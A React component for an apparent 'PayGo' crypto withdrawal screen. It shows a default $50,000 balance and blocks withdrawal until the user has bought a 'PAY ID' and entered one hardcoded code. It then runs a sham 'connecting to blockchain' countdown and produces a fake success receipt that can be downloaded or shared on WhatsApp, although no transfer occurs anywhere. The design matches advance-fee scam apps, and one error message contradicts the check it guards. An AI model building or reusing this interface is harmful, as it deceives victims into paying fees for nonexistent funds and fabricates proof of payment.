import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import {
  ArrowLeft,
  CheckCircle2,
  Lock,
  ExternalLink,
  Eye,
  EyeOff,
  Download,
  Share2,
  CreditCard,
  User,
  AlertCircle,
  Bitcoin,
} from 'lucide-react';

interface TransferProps {
  onBack: () => void;
  onNavigateToBuyPayId: () => void;
}

const TRADING_EXCHANGES = ['Binance', 'TrustWallet', 'Bybit', 'KuCoin', 'OKX', 'MetaMask', 'Other Wallet'];

export const Transfer: React.FC<TransferProps> = ({ onBack, onNavigateToBuyPayId }) => {
  const { user, updateBalance, addTransaction, transactions } = useAuth();

  const [walletUsername, setWalletUsername] = useState('');
  const [exchange, setExchange] = useState('Binance');
  const [walletAddress, setWalletAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [payId, setPayId] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [countdown, setCountdown] = useState(10);
  const [showMaskedPayId, setShowMaskedPayId] = useState(false);
  const [receiptTxnId, setReceiptTxnId] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  const REQUIRED_PAY_ID = "PG-7474PAYDDT1I2P18837DOEFQ";

  // Processing countdown
  useEffect(() => {
    let timer: any;
    if (isProcessing && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    } else if (isProcessing && countdown === 0) {
      const amt = parseFloat(amount);
      updateBalance(amt);
      addTransaction({
        type: 'Transfer',
        amount: amt,
        recipientName: walletUsername,
        cryptoExchange: exchange,
        walletAddress: walletAddress,
        date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
      });
      setIsProcessing(false);
      setIsSuccess(true);
    }
    return () => clearTimeout(timer);
  }, [isProcessing, countdown]);

  const handleStartTransfer = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!walletUsername || !walletAddress || !amount || !payId) {
      setErrorMsg('Please fill in all required fields');
      return;
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      setErrorMsg('Please enter a valid amount');
      return;
    }

    if (transferAmount > (user?.balance || 0)) {
      setErrorMsg('Insufficient balance. Please enter an amount within your balance.');
      return;
    }

    // Check if PAY ID has been purchased (via transactions)
    const hasPayId = transactions.some(t => t.type === 'PAY ID Purchase');
    if (!hasPayId) {
      setErrorMsg('You must purchase a PAY ID before you can withdraw. Tap "Buy PAY ID" on the dashboard.');
      return;
    }

    // Withdrawal Restriction: >$5000 requires Ruby Tier
    if (transferAmount > 5000) {
      const currentLevel = user?.accountLevel || 'Basic';
      if (!currentLevel.includes('Ruby') && !currentLevel.includes('Diamond') && !currentLevel.includes('Black')) {
        setErrorMsg('Minimum withdrawal is $5000. Upgrade to Ruby Tier or higher to withdraw more.');
        return;
      }
    }

    // Official PayGo validation
    if (payId.trim() !== REQUIRED_PAY_ID) {
      setErrorMsg(
        `Invalid PayGo ID. Only ${REQUIRED_PAY_ID} is allowed for transfers. Tap "Buy PAY ID" to generate yours.`
      );
      return;
    }

    setReceiptTxnId(`TXN${Date.now().toString().slice(-8)}`);
    setCountdown(10);
    setIsProcessing(true);
  };

  const handleDownloadReceipt = () => {
    const receiptContent = `
PAYGO TRANSACTION RECEIPT
--------------------------
Transaction Status: SUCCESSFUL
Reference: ${receiptTxnId}
Amount: $${parseFloat(amount).toLocaleString()}
Wallet/Username: ${walletUsername}
Exchange/Network: ${exchange}
Wallet Address: ${walletAddress}
Date & Time: ${new Date().toLocaleString()}
Processed by: PayGo Financial Services
--------------------------
Keep this receipt for your records.
    `.trim();

    const blob = new Blob([receiptContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `paygo_receipt_${receiptTxnId}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleShareReceipt = () => {
    const text = encodeURIComponent(
      `PayGo Crypto Withdrawal of $${parseFloat(amount).toLocaleString()} to ${exchange} (${walletUsername}) was successful! Ref: ${receiptTxnId}`
    );
    window.open(`https://wa.me/?text=${text}`, '_blank');
  };

  // Processing screen
  if (isProcessing) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-sm w-full text-center shadow-xl border border-gray-100 space-y-5">
          <div className="w-20 h-20 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto" />
          <h3 className="text-2xl font-bold text-gray-900">Processing Crypto</h3>
          <p className="text-sm text-gray-500">
            Connecting to blockchain network and verifying PAY ID...
          </p>
          <div className="text-4xl font-black text-purple-600 font-mono">{countdown}s</div>
          <div className="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
            <div
              className="bg-purple-600 h-full rounded-full transition-all duration-1000"
              style={{ width: `${((10 - countdown) / 10) * 100}%` }}
            />
          </div>
          <p className="text-xs text-gray-400">Please do not close this window</p>
        </div>
      </div>
    );
  }

  // Success Receipt view
  if (isSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 sm:p-6">
        <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden border border-gray-100">
          <div className="bg-gradient-to-r from-emerald-500 to-green-600 text-white p-6 text-center">
            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3 backdrop-blur-xs">
              <CheckCircle2 className="w-9 h-9 text-white" />
            </div>
            <h2 className="text-2xl font-bold">Transfer Successful</h2>
            <p className="text-emerald-100 text-sm mt-0.5">Your funds have been sent</p>
          </div>

          <div className="p-6 text-center border-b border-gray-100 bg-gray-50/50">
            <p className="text-xs font-semibold uppercase tracking-wider text-gray-500 mb-1">
              Amount Sent
            </p>
            <h1 className="text-3xl sm:text-4xl font-black text-gray-900">
              ${parseFloat(amount).toLocaleString('en-NG', { minimumFractionDigits: 2 })}
            </h1>
          </div>

          <div className="p-6 space-y-4">
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <p className="text-gray-400 text-xs uppercase font-medium">Wallet Username</p>
                <p className="font-bold text-gray-900">{walletUsername}</p>
              </div>
              <div>
                <p className="text-gray-400 text-xs uppercase font-medium">Exchange</p>
                <p className="font-bold text-gray-900">{exchange}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 text-sm">
              <div className="col-span-2">
                <p className="text-gray-400 text-xs uppercase font-medium">Wallet Address</p>
                <p className="font-bold font-mono text-gray-900 text-xs break-all">{walletAddress}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 text-sm pt-1">
              <div>
                <p className="text-gray-400 text-xs uppercase font-medium">Transaction Ref</p>
                <p className="font-bold font-mono text-gray-900">{receiptTxnId}</p>
              </div>
              <div>
                <p className="text-gray-400 text-xs uppercase font-medium">Date & Time</p>
                <p className="font-semibold text-gray-900 text-xs">{new Date().toLocaleString()}</p>
              </div>
            </div>

            <div className="bg-gray-50 rounded-xl p-3 text-center text-xs text-gray-500 border border-gray-100">
              <p>Transaction processed securely by PayGo</p>
              <p className="text-gray-400 text-[11px] mt-0.5">Keep this receipt for your records</p>
            </div>

            <div className="grid grid-cols-2 gap-3 pt-2">
              <button
                onClick={handleDownloadReceipt}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-semibold py-3 px-3 rounded-xl text-xs flex items-center justify-center space-x-1.5 transition-all cursor-pointer"
              >
                <Download className="w-4 h-4" />
                <span>Save Receipt</span>
              </button>
              <button
                onClick={handleShareReceipt}
                className="w-full bg-emerald-50 hover:bg-emerald-100 text-emerald-700 font-semibold py-3 px-3 rounded-xl text-xs flex items-center justify-center space-x-1.5 transition-all border border-emerald-200 cursor-pointer"
              >
                <Share2 className="w-4 h-4" />
                <span>Share</span>
              </button>
            </div>

            <button
              onClick={onBack}
              className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-md transition-all mt-2 cursor-pointer"
            >
              Done & Return to Dashboard
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      {/* Top Header */}
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <button
              onClick={onBack}
              className="p-2 hover:bg-white/10 rounded-full transition-colors text-white cursor-pointer"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <h1 className="text-lg font-bold">Crypto Withdrawal</h1>
              <p className="text-xs text-purple-200">Instant Crypto / Trading Withdrawal</p>
            </div>
          </div>

          <button
            onClick={onNavigateToBuyPayId}
            className="text-xs bg-amber-400 hover:bg-amber-500 text-purple-950 font-bold px-3 py-1.5 rounded-xl shadow-xs transition-colors flex items-center space-x-1 cursor-pointer"
          >
            <span>Buy PAY ID</span>
          </button>
        </div>
      </div>

      <div className="max-w-xl mx-auto p-4 sm:p-6 space-y-6">
        {/* Available Balance Box */}
        <div className="bg-gradient-to-r from-purple-900 to-indigo-900 text-white rounded-2xl p-5 shadow-sm flex items-center justify-between">
          <div>
            <p className="text-xs uppercase tracking-wider text-purple-200 font-medium">
              Available Balance
            </p>
            <h2 className="text-2xl sm:text-3xl font-black mt-1">
              ${(user?.balance ?? 50000).toLocaleString('en-NG', { minimumFractionDigits: 2 })}
            </h2>
          </div>
          <div className="text-right">
            <span className="text-[11px] bg-emerald-500/20 text-emerald-300 font-semibold px-2.5 py-1 rounded-full border border-emerald-400/30">
              Ready to Withdraw
            </span>
          </div>
        </div>

        {errorMsg && (
          <div className="p-4 bg-red-50 border border-red-200 rounded-xl text-red-700 text-xs flex items-start space-x-2">
            <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-500" />
            <div>
              <p className="font-semibold">{errorMsg}</p>
              {errorMsg.includes(REQUIRED_PAY_ID) && (
                <div className="mt-2 flex items-center space-x-2">
                  <button
                    type="button"
                    onClick={() => {
                      setPayId(REQUIRED_PAY_ID);
                      setErrorMsg('');
                    }}
                    className="bg-purple-600 hover:bg-purple-700 text-white px-2.5 py-1 rounded text-xs font-semibold cursor-pointer"
                  >
                    Paste Test PAY ID
                  </button>
                  <button
                    type="button"
                    onClick={onNavigateToBuyPayId}
                    className="text-purple-700 font-bold underline text-xs cursor-pointer"
                  >
                    Buy PAY ID Code
                  </button>
                </div>
              )}
            </div>
          </div>
        )}

        <div className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100">
          <h2 className="text-lg font-bold text-gray-900 mb-5">Withdrawal Details</h2>

          <form onSubmit={handleStartTransfer} className="space-y-4">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Wallet / Account Username
              </label>
              <div className="relative">
                <User className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                <input
                  type="text"
                  value={walletUsername}
                  onChange={(e) => setWalletUsername(e.target.value)}
                  placeholder="Enter your exchange username"
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Exchange / Network
              </label>
              <div className="relative">
                <Bitcoin className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" />
                <select
                  value={exchange}
                  onChange={(e) => setExchange(e.target.value)}
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 bg-white"
                >
                  {TRADING_EXCHANGES.map((b) => (
                    <option key={b} value={b}>
                      {b}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Wallet Address
              </label>
              <div className="relative">
                <CreditCard className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                <input
                  type="text"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="Enter deposit wallet address"
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Amount ($)
              </label>
              <div className="relative">
                <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-sm">
                  $
                </span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="e.g. 50000"
                  max={user?.balance || 50000}
                  className="w-full pl-8 pr-16 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-bold text-gray-900"
                  required
                />
                <button
                  type="button"
                  onClick={() => setAmount(String(user?.balance || 50000))}
                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-xs bg-purple-100 text-purple-700 hover:bg-purple-200 px-2 py-1 rounded-lg font-semibold cursor-pointer"
                >
                  MAX
                </button>
              </div>
            </div>

            {/* PayGo ID field with Buy Code helper */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600">
                  PayGo ID Code
                </label>
                <button
                  type="button"
                  onClick={onNavigateToBuyPayId}
                  className="text-xs text-purple-600 font-semibold hover:underline flex items-center space-x-1 cursor-pointer"
                >
                  <span>Buy PAY ID code</span>
                  <ExternalLink className="w-3 h-3" />
                </button>
              </div>

              <div className="relative">
                <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                <input
                  type="text"
                  value={payId}
                  onChange={(e) => setPayId(e.target.value)}
                  placeholder="Enter PAY ID (e.g. PG-7474PAYDDT1I2P18837DOEFQ)"
                  className="w-full pl-10 pr-24 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-xs font-mono text-gray-900"
                  required
                />
                <button
                  type="button"
                  onClick={() => setPayId(REQUIRED_PAY_ID)}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-[11px] bg-purple-50 text-purple-700 hover:bg-purple-100 px-2 py-1 rounded-lg font-semibold border border-purple-200 cursor-pointer"
                >
                  Auto-fill
                </button>
              </div>
              <p className="text-[11px] text-gray-400 mt-1">
                A valid PAY ID is required to authorize crypto/trading withdrawals.
              </p>
            </div>

            <button
              type="submit"
              className="w-full mt-4 bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
            >
              <span>Confirm & Withdraw Crypto</span>
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};
